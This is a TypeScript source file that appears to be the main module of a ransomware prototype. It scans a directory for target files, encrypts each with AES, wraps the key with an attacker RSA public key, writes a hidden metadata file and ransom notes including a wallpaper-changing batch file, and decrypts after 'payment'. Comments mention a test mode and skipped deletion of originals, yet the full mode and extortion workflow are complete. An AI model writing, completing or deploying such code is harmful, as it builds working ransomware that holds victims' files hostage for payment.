import fs from 'fs'
import path from 'path'
import { encryptFile, decryptFile } from './aesEncryption'
import {
    initializeKeyManagement,
    storeFileIV,
    encryptAESKey,
    decryptAESKey,
    createKeyMetadataFile,
    readKeyMetadataFile
} from './keyManager'
import { scanDirectory, getTestTargetFiles } from './fileScanner'
import { createRansomNote } from './ransomNote'

// File extension for encrypted files
const ENCRYPTED_EXTENSION = '.encrypted'

// Function to encrypt all target files in a directory
export async function encryptTargetFiles(
    targetDirectory: string,
    isTestMode: boolean = true
): Promise<{
    victimId: string
    encryptedAESKey: Buffer
    attackerPrivateKey: string
    encryptedFiles: string[]
}> {
    console.log(`[+] Initializing ransomware encryption process...`)

    // Initialize key management
    const { victimId, aesKey, attackerPublicKey, attackerPrivateKey } =
        initializeKeyManagement()
    console.log(`[+] Victim ID: ${victimId}`)

    // Get target files
    let targetFiles: string[]
    if (isTestMode) {
        console.log(
            `[+] Running in TEST MODE - targeting a limited number of files`
        )
        targetFiles = getTestTargetFiles(targetDirectory)
    } else {
        console.log(`[+] Running in FULL MODE - scanning for all target files`)
        targetFiles = scanDirectory(targetDirectory)
    }

    console.log(`[+] Found ${targetFiles.length} target files`)

    // Encrypt each file
    const encryptedFiles: string[] = []
    for (const filePath of targetFiles) {
        try {
            const encryptedPath = `${filePath}${ENCRYPTED_EXTENSION}`
            console.log(`[+] Encrypting: ${filePath}`)

            // Encrypt the file
            const { iv } = await encryptFile(filePath, encryptedPath, aesKey)

            // Store the IV for this file
            storeFileIV(victimId, filePath, iv)

            // Add to the list of encrypted files
            encryptedFiles.push(filePath)

            // In a real attack, the original file would be deleted
            // For safety in this prototype, we're not deleting the original files
            if (!isTestMode) {
                console.log(`[-] Would delete original file: ${filePath}`)
            }
        } catch (err) {
            console.error(`[!] Error encrypting ${filePath}: ${err}`)
        }
    }

    // Encrypt the AES key with the attacker's public key
    const encryptedAESKey = encryptAESKey(aesKey, attackerPublicKey)
    console.log(`[+] AES key encrypted with RSA`)

    // Create metadata file
    createKeyMetadataFile(victimId, encryptedAESKey, targetDirectory)
    console.log(`[+] Created metadata file`)

    // Create ransom note
    createRansomNote(victimId, targetDirectory, encryptedFiles.length)
    console.log(`[+] Created ransom note`)

    return {
        victimId,
        encryptedAESKey,
        attackerPrivateKey,
        encryptedFiles
    }
}

// Function to decrypt files after "payment"
export async function decryptFiles(
    targetDirectory: string,
    encryptedAESKey: Buffer,
    attackerPrivateKey: string
): Promise<string[]> {
    console.log(`[+] Initializing decryption process...`)

    // Find and read the metadata file
    const metadataPath = path.join(targetDirectory, '.ransom_metadata')
    if (!fs.existsSync(metadataPath)) {
        throw new Error(`Metadata file not found at ${metadataPath}`)
    }

    // Read the metadata
    const { victimId, ivMap } = readKeyMetadataFile(
        metadataPath,
        targetDirectory
    )
    console.log(`[+] Found metadata for victim ID: ${victimId}`)

    // Decrypt the AES key
    const aesKey = decryptAESKey(encryptedAESKey, attackerPrivateKey)
    console.log(`[+] Successfully decrypted the AES key`)

    // Decrypt each file
    const decryptedFiles: string[] = []
    for (const [filePath, iv] of ivMap.entries()) {
        try {
            const encryptedPath = `${filePath}${ENCRYPTED_EXTENSION}`

            // Check if the encrypted file exists
            if (!fs.existsSync(encryptedPath)) {
                console.error(`[!] Encrypted file not found: ${encryptedPath}`)
                continue
            }

            console.log(`[+] Decrypting: ${filePath}`)

            // Get the original file extension
            const originalPath = filePath // In a real attack, the .decrypted suffix might be added

            // Decrypt the file
            await decryptFile(encryptedPath, originalPath, aesKey, iv)

            // Add to the list of decrypted files
            decryptedFiles.push(filePath)

            // Delete the encrypted file
            fs.unlinkSync(encryptedPath)
            console.log(`[+] Deleted encrypted file: ${encryptedPath}`)
        } catch (err) {
            console.error(`[!] Error decrypting ${filePath}: ${err}`)
        }
    }

    // Delete the metadata file
    fs.unlinkSync(metadataPath)
    console.log(`[+] Deleted metadata file`)

    // Delete the ransom note
    const txtNotePath = path.join(targetDirectory, 'RANSOM_NOTE.txt')
    const htmlNotePath = path.join(targetDirectory, 'RANSOM_NOTE.html')
    const bgChangerPath = path.join(targetDirectory, 'change_background.bat')

    if (fs.existsSync(txtNotePath)) {
        fs.unlinkSync(txtNotePath)
    }

    if (fs.existsSync(htmlNotePath)) {
        fs.unlinkSync(htmlNotePath)
    }

    if (fs.existsSync(bgChangerPath)) {
        fs.unlinkSync(bgChangerPath)
    }

    console.log(`[+] Deleted ransom notes`)

    return decryptedFiles
}
